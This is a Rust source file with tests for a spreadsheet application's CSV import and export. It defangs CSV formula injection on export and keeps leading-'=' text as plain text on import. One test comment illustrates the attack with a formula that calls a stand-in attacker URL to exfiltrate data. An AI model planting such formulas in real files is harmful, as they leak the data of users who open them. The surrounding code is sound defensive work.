//! Submodule of `services` — see services/mod.rs.

#![allow(unused_imports)]
use super::*;
use crate::domain::models::Spreadsheet;


/// CSV import/export service.
pub struct CsvExporter;

impl CsvExporter {
    /// Writes the rectangular A1-to-last-nonempty region as CSV.
    ///
    /// ```
    /// use tshts::domain::{Spreadsheet, CsvExporter};
    /// let sheet = Spreadsheet::default();
    /// let _ = CsvExporter::export_to_csv(&sheet, "data.csv");
    /// ```
    pub fn export_to_csv(spreadsheet: &Spreadsheet, filename: &str) -> Result<String, String> {
        // Find the bounds of actual data
        let (max_row, max_col) = Self::find_data_bounds(spreadsheet);

        let a1 = spreadsheet.get_cell(0, 0);
        let a1_has_data = !a1.value.is_empty() || a1.formula.is_some();
        if max_row == 0 && max_col == 0 && !a1_has_data {
            return Err("No data to export".to_string());
        }

        // Build into a buffer so we can atomic_write the result. Spreadsheets
        // that span millions of rows are an outlier, so paying the memory
        // cost for atomicity is fine.
        let mut buf: Vec<u8> = Vec::with_capacity(1024);
        {
            let mut writer = ::csv::Writer::from_writer(&mut buf);
            for row in 0..=max_row {
                let mut record = Vec::with_capacity(max_col + 1);
                for col in 0..=max_col {
                    let cell = spreadsheet.get_cell(row, col);
                    record.push(Self::sanitize_csv_field(&cell.value));
                }
                writer.write_record(&record).map_err(|e| format!("Failed to write row: {}", e))?;
            }
            writer.flush().map_err(|e| format!("Failed to flush CSV writer: {}", e))?;
        }
        crate::infrastructure::atomic::atomic_write(filename, &buf)
            .map_err(|e| format!("Failed to write CSV: {}", e))?;
        Ok(filename.to_string())
    }

    /// Defang CSV-injection vectors on export. Excel/Sheets evaluate a cell
    /// whose text starts with `=`, `+`, `-`, `@`, tab, or CR — even though
    /// the cell never carried a formula in tshts. Prefixing with `'` is the
    /// standard mitigation. Cells with normal content pass through unchanged.
    fn sanitize_csv_field(value: &str) -> String {
        let leading_dangerous = value
            .chars()
            .next()
            .is_some_and(|c| matches!(c, '=' | '+' | '-' | '@' | '\t' | '\r'));
        if leading_dangerous {
            let mut out = String::with_capacity(value.len() + 1);
            out.push('\'');
            out.push_str(value);
            out
        } else {
            value.to_string()
        }
    }
    
    /// Reads `filename` into a fresh `Spreadsheet`; no header row is assumed.
    ///
    /// ```no_run
    /// use tshts::domain::CsvExporter;
    /// let _ = CsvExporter::import_from_csv("data.csv");
    /// ```
    pub fn import_from_csv(filename: &str) -> Result<Spreadsheet, String> {
        // Read into memory so we can strip the BOM before parsing. CSVs
        // exported by Excel always begin with U+FEFF; without this the
        // first cell becomes `"\u{feff}Name"` and header matching breaks.
        let mut bytes = std::fs::read(filename)
            .map_err(|e| format!("Failed to open file: {}", e))?;
        if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
            bytes.drain(..3);
        }
        let mut reader = ::csv::ReaderBuilder::new()
            .has_headers(false)
            .flexible(true)
            .from_reader(std::io::Cursor::new(bytes));

        let mut spreadsheet = Spreadsheet::default();
        let mut max_row = 0;
        let mut max_col = 0;

        for (row_index, result) in reader.records().enumerate() {
            let record = result.map_err(|e| format!("Failed to read CSV row {}: {}", row_index + 1, e))?;

            for (col_index, field) in record.iter().enumerate() {
                if !field.is_empty() {
                    // Untrusted CSVs are common (downloads, shared sheets).
                    // Don't auto-promote leading-`=` text to a tshts formula
                    // — that's a CSV-injection vector (the cell could call
                    // GET() or other side-effecting functions on load).
                    // The user can manually convert via the formula bar if
                    // they actually want a formula.
                    let cell_data = crate::domain::models::CellData {
                        value: field.to_string(),
                        formula: None,
                        format: None,
                        comment: None,
                        spill_anchor: None,
                    };
                    spreadsheet.set_cell(row_index, col_index, cell_data);
                }
                max_col = max_col.max(col_index);
            }
            max_row = max_row.max(row_index);
        }

        if max_row > 0 || max_col > 0 {
            spreadsheet.rows = spreadsheet.rows.max(max_row + 5);
            spreadsheet.cols = spreadsheet.cols.max(max_col + 5);
        }

        spreadsheet.rebuild_dependencies();

        Ok(spreadsheet)
    }

    /// Append CSV rows beneath the existing data in `dest`, starting one row
    /// below the last non-empty cell. Used by `:import-append`.
    pub fn append_from_csv(dest: &mut Spreadsheet, filename: &str) -> Result<usize, String> {
        let mut bytes = std::fs::read(filename).map_err(|e| e.to_string())?;
        if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
            bytes.drain(..3);
        }
        let mut reader = ::csv::ReaderBuilder::new()
            .has_headers(false)
            .flexible(true)
            .from_reader(std::io::Cursor::new(bytes));
        let (existing_max_row, _) = Self::find_data_bounds(dest);
        let mut next_row = if dest.cells.is_empty() {
            0
        } else {
            existing_max_row + 1
        };
        let start_row = next_row;
        for record in reader.records() {
            let record = record.map_err(|e| e.to_string())?;
            for (col_index, field) in record.iter().enumerate() {
                if !field.is_empty() {
                    // Same defang as import_from_csv: don't auto-promote
                    // leading-`=` strings to formulas on import.
                    let cell_data = crate::domain::models::CellData {
                        value: field.to_string(),
                        formula: None,
                        format: None,
                        comment: None,
                        spill_anchor: None,
                    };
                    dest.set_cell(next_row, col_index, cell_data);
                }
            }
            next_row += 1;
        }
        let appended = next_row - start_row;
        if next_row > 0 {
            dest.rows = dest.rows.max(next_row + 5);
        }
        dest.rebuild_dependencies();
        Ok(appended)
    }

    pub(super) fn find_data_bounds(spreadsheet: &Spreadsheet) -> (usize, usize) {
        let mut max_row = 0;
        let mut max_col = 0;

        for ((row, col), cell) in &spreadsheet.cells {
            // A cell counts as data if it has a displayed value OR a formula
            // whose value hasn't been computed yet (e.g. freshly-loaded sheet).
            let has_data = !cell.value.is_empty() || cell.formula.is_some();
            if has_data {
                max_row = max_row.max(*row);
                max_col = max_col.max(*col);
            }
        }

        (max_row, max_col)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::domain::{CellData, Spreadsheet};

    fn create_test_spreadsheet() -> Spreadsheet {
        let mut sheet = Spreadsheet::default();
        sheet.set_cell(0, 0, CellData { value: "10".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 1, CellData { value: "20".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 2, CellData { value: "30".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(1, 0, CellData { value: "5".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(1, 1, CellData { value: "15".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(1, 2, CellData { value: "25".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet
    }

    #[test]
    fn test_append_from_csv() {
        use std::io::Write;
        use tempfile::NamedTempFile;

        let mut sheet = Spreadsheet::default();
        sheet.set_cell(0, 0, CellData { value: "header".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(1, 0, CellData { value: "alpha".to_string(), formula: None, format: None, comment: None, spill_anchor: None });

        let mut tmp = NamedTempFile::new().unwrap();
        writeln!(tmp, "beta,1").unwrap();
        writeln!(tmp, "gamma,2").unwrap();

        let n = CsvExporter::append_from_csv(&mut sheet, tmp.path().to_str().unwrap()).unwrap();
        assert_eq!(n, 2);
        assert_eq!(sheet.get_cell(2, 0).value, "beta");
        assert_eq!(sheet.get_cell(3, 0).value, "gamma");
        // Pre-existing rows untouched.
        assert_eq!(sheet.get_cell(0, 0).value, "header");
        assert_eq!(sheet.get_cell(1, 0).value, "alpha");
    }

    #[test]
    fn test_csv_export_basic() {
        use tempfile::NamedTempFile;
        
        let mut sheet = Spreadsheet::default();
        sheet.set_cell(0, 0, CellData { value: "Name".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 1, CellData { value: "Age".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(1, 0, CellData { value: "Alice".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(1, 1, CellData { value: "30".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(2, 0, CellData { value: "Bob".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(2, 1, CellData { value: "25".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        
        let temp_file = NamedTempFile::new().expect("Failed to create temp file");
        let file_path = temp_file.path().to_str().unwrap();
        
        let result = CsvExporter::export_to_csv(&sheet, file_path);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), file_path);
        
        // Read back the CSV and verify content
        let content = std::fs::read_to_string(file_path).expect("Failed to read CSV file");
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 3);
        assert_eq!(lines[0], "Name,Age");
        assert_eq!(lines[1], "Alice,30");
        assert_eq!(lines[2], "Bob,25");
    }

    #[test]
    fn test_csv_export_empty_sheet() {
        use tempfile::NamedTempFile;
        
        let sheet = Spreadsheet::default();
        let temp_file = NamedTempFile::new().expect("Failed to create temp file");
        let file_path = temp_file.path().to_str().unwrap();
        
        let result = CsvExporter::export_to_csv(&sheet, file_path);
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), "No data to export");
    }

    #[test]
    fn test_csv_export_sparse_data() {
        use tempfile::NamedTempFile;
        
        let mut sheet = Spreadsheet::default();
        sheet.set_cell(0, 0, CellData { value: "A1".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(2, 3, CellData { value: "D3".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(1, 1, CellData { value: "B2".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        
        let temp_file = NamedTempFile::new().expect("Failed to create temp file");
        let file_path = temp_file.path().to_str().unwrap();
        
        let result = CsvExporter::export_to_csv(&sheet, file_path);
        assert!(result.is_ok());
        
        // Read back the CSV and verify content
        let content = std::fs::read_to_string(file_path).expect("Failed to read CSV file");
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 3); // 0 to 2 (max_row)
        assert_eq!(lines[0], "A1,,,"); // A1 with empty cells up to column 3
        assert_eq!(lines[1], ",B2,,"); // Empty, B2, empty, empty
        assert_eq!(lines[2], ",,,D3"); // Empty cells then D3
    }

    #[test]
    fn test_csv_export_with_formulas() {
        use tempfile::NamedTempFile;
        
        let mut sheet = Spreadsheet::default();
        sheet.set_cell(0, 0, CellData { value: "10".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 1, CellData { value: "20".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 2, CellData { 
            value: "30".to_string(), 
            formula: Some("=A1+B1".to_string()),
            format: None,
            comment: None,
        spill_anchor: None,
        });
        
        let temp_file = NamedTempFile::new().expect("Failed to create temp file");
        let file_path = temp_file.path().to_str().unwrap();
        
        let result = CsvExporter::export_to_csv(&sheet, file_path);
        assert!(result.is_ok());
        
        // Read back the CSV - should contain values, not formulas
        let content = std::fs::read_to_string(file_path).expect("Failed to read CSV file");
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0], "10,20,30"); // Values, not formulas
    }

    #[test]
    fn test_csv_export_special_characters() {
        use tempfile::NamedTempFile;
        
        let mut sheet = Spreadsheet::default();
        sheet.set_cell(0, 0, CellData { value: "Hello, World!".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 1, CellData { value: "\"Quoted\"".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 2, CellData { value: "Line\nBreak".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        
        let temp_file = NamedTempFile::new().expect("Failed to create temp file");
        let file_path = temp_file.path().to_str().unwrap();
        
        let result = CsvExporter::export_to_csv(&sheet, file_path);
        assert!(result.is_ok());
        
        // The CSV library should handle proper escaping
        let content = std::fs::read_to_string(file_path).expect("Failed to read CSV file");
        assert!(content.contains("Hello, World!"));
        assert!(content.contains("\"Quoted\""));
        assert!(content.contains("Line\nBreak"));
    }

    #[test]
    fn test_find_data_bounds() {
        let mut sheet = Spreadsheet::default();
        
        // Test empty sheet
        let (max_row, max_col) = CsvExporter::find_data_bounds(&sheet);
        assert_eq!((max_row, max_col), (0, 0));
        
        // Add some data
        sheet.set_cell(5, 3, CellData { value: "data".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(2, 7, CellData { value: "more".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 0, CellData { value: "start".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        
        let (max_row, max_col) = CsvExporter::find_data_bounds(&sheet);
        assert_eq!((max_row, max_col), (5, 7));
    }

    #[test]
    fn test_csv_import_basic() {
        use tempfile::NamedTempFile;
        use std::io::Write;
        
        let mut temp_file = NamedTempFile::new().expect("Failed to create temp file");
        writeln!(temp_file, "Name,Age,City").expect("Failed to write to temp file");
        writeln!(temp_file, "Alice,30,New York").expect("Failed to write to temp file");
        writeln!(temp_file, "Bob,25,Los Angeles").expect("Failed to write to temp file");
        writeln!(temp_file, "Charlie,35,Chicago").expect("Failed to write to temp file");
        
        let file_path = temp_file.path().to_str().unwrap();
        let result = CsvExporter::import_from_csv(file_path);
        assert!(result.is_ok());
        
        let sheet = result.unwrap();
        
        // Check headers
        assert_eq!(sheet.get_cell(0, 0).value, "Name");
        assert_eq!(sheet.get_cell(0, 1).value, "Age");
        assert_eq!(sheet.get_cell(0, 2).value, "City");
        
        // Check data rows
        assert_eq!(sheet.get_cell(1, 0).value, "Alice");
        assert_eq!(sheet.get_cell(1, 1).value, "30");
        assert_eq!(sheet.get_cell(1, 2).value, "New York");
        
        assert_eq!(sheet.get_cell(2, 0).value, "Bob");
        assert_eq!(sheet.get_cell(2, 1).value, "25");
        assert_eq!(sheet.get_cell(2, 2).value, "Los Angeles");
        
        assert_eq!(sheet.get_cell(3, 0).value, "Charlie");
        assert_eq!(sheet.get_cell(3, 1).value, "35");
        assert_eq!(sheet.get_cell(3, 2).value, "Chicago");
        
        // Check that dimensions were updated appropriately
        assert!(sheet.rows >= 4);
        assert!(sheet.cols >= 3);
    }

    #[test]
    fn test_csv_import_empty_cells() {
        use tempfile::NamedTempFile;
        use std::io::Write;
        
        let mut temp_file = NamedTempFile::new().expect("Failed to create temp file");
        writeln!(temp_file, "A,,C").expect("Failed to write to temp file");
        writeln!(temp_file, ",B,").expect("Failed to write to temp file");
        writeln!(temp_file, ",,").expect("Failed to write to temp file");
        writeln!(temp_file, "D,E,F").expect("Failed to write to temp file");
        
        let file_path = temp_file.path().to_str().unwrap();
        let result = CsvExporter::import_from_csv(file_path);
        assert!(result.is_ok());
        
        let sheet = result.unwrap();
        
        // Check non-empty cells
        assert_eq!(sheet.get_cell(0, 0).value, "A");
        assert_eq!(sheet.get_cell(0, 2).value, "C");
        assert_eq!(sheet.get_cell(1, 1).value, "B");
        assert_eq!(sheet.get_cell(3, 0).value, "D");
        assert_eq!(sheet.get_cell(3, 1).value, "E");
        assert_eq!(sheet.get_cell(3, 2).value, "F");
        
        // Check empty cells remain empty
        assert!(sheet.get_cell(0, 1).value.is_empty());
        assert!(sheet.get_cell(1, 0).value.is_empty());
        assert!(sheet.get_cell(1, 2).value.is_empty());
        assert!(sheet.get_cell(2, 0).value.is_empty());
        assert!(sheet.get_cell(2, 1).value.is_empty());
        assert!(sheet.get_cell(2, 2).value.is_empty());
    }

    #[test]
    fn test_csv_import_special_characters() {
        use tempfile::NamedTempFile;
        use std::io::Write;
        
        let mut temp_file = NamedTempFile::new().expect("Failed to create temp file");
        writeln!(temp_file, r#""Hello, World!","Quote ""Test""","Line
Break""#).expect("Failed to write to temp file");
        writeln!(temp_file, "Héllo Wörld,🌍,Тест").expect("Failed to write to temp file");
        
        let file_path = temp_file.path().to_str().unwrap();
        let result = CsvExporter::import_from_csv(file_path);
        assert!(result.is_ok());
        
        let sheet = result.unwrap();
        
        // Check that special characters are preserved
        assert_eq!(sheet.get_cell(0, 0).value, "Hello, World!");
        assert_eq!(sheet.get_cell(0, 1).value, "Quote \"Test\"");
        assert_eq!(sheet.get_cell(0, 2).value, "Line\nBreak");
        assert_eq!(sheet.get_cell(1, 0).value, "Héllo Wörld");
        assert_eq!(sheet.get_cell(1, 1).value, "🌍");
        assert_eq!(sheet.get_cell(1, 2).value, "Тест");
    }

    #[test]
    fn test_csv_import_numbers() {
        use tempfile::NamedTempFile;
        use std::io::Write;
        
        let mut temp_file = NamedTempFile::new().expect("Failed to create temp file");
        writeln!(temp_file, "Integer,Decimal,Negative,Scientific").expect("Failed to write to temp file");
        writeln!(temp_file, "42,3.14159,-273.15,6.022e23").expect("Failed to write to temp file");
        writeln!(temp_file, "0,0.0,-0,1.0e-10").expect("Failed to write to temp file");
        
        let file_path = temp_file.path().to_str().unwrap();
        let result = CsvExporter::import_from_csv(file_path);
        assert!(result.is_ok());
        
        let sheet = result.unwrap();
        
        // Check that numbers are imported as strings (no automatic conversion)
        assert_eq!(sheet.get_cell(1, 0).value, "42");
        assert_eq!(sheet.get_cell(1, 1).value, "3.14159");
        assert_eq!(sheet.get_cell(1, 2).value, "-273.15");
        assert_eq!(sheet.get_cell(1, 3).value, "6.022e23");
        assert_eq!(sheet.get_cell(2, 0).value, "0");
        assert_eq!(sheet.get_cell(2, 1).value, "0.0");
        assert_eq!(sheet.get_cell(2, 2).value, "-0");
        assert_eq!(sheet.get_cell(2, 3).value, "1.0e-10");
        
        // Verify that none of these have formulas
        assert!(sheet.get_cell(1, 0).formula.is_none());
        assert!(sheet.get_cell(1, 1).formula.is_none());
        assert!(sheet.get_cell(1, 2).formula.is_none());
        assert!(sheet.get_cell(1, 3).formula.is_none());
    }

    #[test]
    fn test_csv_import_nonexistent_file() {
        let result = CsvExporter::import_from_csv("/nonexistent/file.csv");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Failed to open file"));
    }

    #[test]
    fn test_csv_import_invalid_csv() {
        use tempfile::NamedTempFile;
        use std::io::Write;
        
        let mut temp_file = NamedTempFile::new().expect("Failed to create temp file");
        // Write invalid CSV (unmatched quote)
        writeln!(temp_file, r#"Valid,"Unmatched quote"#).expect("Failed to write to temp file");
        writeln!(temp_file, "Another line").expect("Failed to write to temp file");
        
        let file_path = temp_file.path().to_str().unwrap();
        let result = CsvExporter::import_from_csv(file_path);
        // This might succeed or fail depending on the CSV parser's tolerance
        // The main thing is that it doesn't panic
        match result {
            Ok(_) => {
                // CSV parser was tolerant of the malformed input
            }
            Err(err) => {
                // CSV parser rejected the malformed input
                assert!(err.contains("Failed to read CSV row"));
            }
        }
    }

    #[test]
    fn test_csv_import_empty_file() {
        use tempfile::NamedTempFile;
        
        let temp_file = NamedTempFile::new().expect("Failed to create temp file");
        let file_path = temp_file.path().to_str().unwrap();
        
        let result = CsvExporter::import_from_csv(file_path);
        assert!(result.is_ok());
        
        let sheet = result.unwrap();
        
        // Empty file should result in empty spreadsheet
        assert_eq!(sheet.rows, 100); // Default dimensions
        assert_eq!(sheet.cols, 26);
        assert!(sheet.cells.is_empty());
    }

    #[test]
    fn test_csv_roundtrip() {
        use tempfile::NamedTempFile;
        
        // Create original spreadsheet
        let mut original = Spreadsheet::default();
        original.set_cell(0, 0, CellData { value: "Name".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        original.set_cell(0, 1, CellData { value: "Score".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        original.set_cell(1, 0, CellData { value: "Alice".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        original.set_cell(1, 1, CellData { value: "95".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        original.set_cell(2, 0, CellData { value: "Bob".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        original.set_cell(2, 1, CellData { value: "87".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        
        // Export to CSV
        let temp_file1 = NamedTempFile::new().expect("Failed to create temp file");
        let export_path = temp_file1.path().to_str().unwrap();
        let export_result = CsvExporter::export_to_csv(&original, export_path);
        assert!(export_result.is_ok());
        
        // Import back from CSV
        let import_result = CsvExporter::import_from_csv(export_path);
        assert!(import_result.is_ok());
        
        let imported = import_result.unwrap();
        
        // Verify data integrity
        assert_eq!(imported.get_cell(0, 0).value, "Name");
        assert_eq!(imported.get_cell(0, 1).value, "Score");
        assert_eq!(imported.get_cell(1, 0).value, "Alice");
        assert_eq!(imported.get_cell(1, 1).value, "95");
        assert_eq!(imported.get_cell(2, 0).value, "Bob");
        assert_eq!(imported.get_cell(2, 1).value, "87");
        
        // All imported cells should have no formulas
        assert!(imported.get_cell(0, 0).formula.is_none());
        assert!(imported.get_cell(0, 1).formula.is_none());
        assert!(imported.get_cell(1, 0).formula.is_none());
        assert!(imported.get_cell(1, 1).formula.is_none());
        assert!(imported.get_cell(2, 0).formula.is_none());
        assert!(imported.get_cell(2, 1).formula.is_none());
    }


    #[test]
    fn agent4_csv_import_treats_equal_prefix_as_text() {
        use std::io::Write;
        let dir = std::env::temp_dir();
        let path = dir.join("agent4_csv_formula.csv");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "1,2").unwrap();
        writeln!(f, "=A1+B1,extra").unwrap();
        drop(f);
        let sheet = CsvExporter::import_from_csv(path.to_str().unwrap()).unwrap();
        let cell = sheet.get_cell(1, 0);
        // Security: don't auto-promote leading-`=` text from untrusted CSV
        // input into a formula. CSV injection is a well-known attack
        // (formulas like `=GET("http://attacker/exfil")` run on load).
        // The user can manually convert to a formula via the formula bar.
        assert_eq!(cell.value, "=A1+B1");
        assert!(cell.formula.is_none(),
            "CSV cells starting with `=` must be imported as plain text to prevent formula injection");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn agent4_csv_import_tolerates_variable_row_widths() {
        use std::io::Write;
        let dir = std::env::temp_dir();
        let path = dir.join("agent4_csv_variable.csv");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "a,b,c").unwrap();
        writeln!(f, "d,e").unwrap();
        writeln!(f, "f,g,h,i").unwrap();
        drop(f);
        let sheet = CsvExporter::import_from_csv(path.to_str().unwrap()).unwrap();
        assert_eq!(sheet.get_cell(2, 3).value, "i",
            "CSV import must tolerate rows with different field counts (flexible=true)");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn agent4_csv_export_includes_formula_only_cells() {
        use crate::domain::CellData;
        let dir = std::env::temp_dir();
        let path = dir.join("agent4_csv_formula_export.csv");
        let mut sheet = Spreadsheet::default();
        // Cell B1 has only a formula, no displayed value yet.
        sheet.set_cell(0, 0, CellData { value: "1".to_string(), formula: None, format: None, comment: None, spill_anchor: None });
        sheet.set_cell(0, 1, CellData { value: "".to_string(), formula: Some("=A1+1".to_string()), format: None, comment: None, spill_anchor: None });
        let res = CsvExporter::export_to_csv(&sheet, path.to_str().unwrap());
        assert!(res.is_ok(), "Export with only a formula cell should succeed: {:?}", res);
        let _ = std::fs::remove_file(&path);
    }

}
